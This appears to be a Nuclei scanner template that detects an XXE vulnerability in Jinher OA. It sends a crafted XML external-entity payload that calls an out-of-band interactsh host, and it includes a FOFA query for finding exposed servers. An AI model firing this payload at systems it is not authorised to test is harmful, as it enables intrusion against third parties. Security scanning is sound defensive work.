id: poc-jinher-epassinittakensninva-aspx-xxe

info:
  name: 金和OA EpassInitTakenSnInva.aspx XXE漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: xxe, dnslog
  metadata:
    product: 金和OA
    fofa-query: app="金和网络-金和OA"

variables:
  reverse: '{{interactsh-url}}'

http:
  - raw:
      - |
        POST /c6/Jhsoft.Web.epass/EpassInitTakenSnInva.aspx/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [
        <!ENTITY % remote SYSTEM "http://{{reverse}}/xxe_test">
        %remote;]>
        <root/>

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "Cookie:"
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
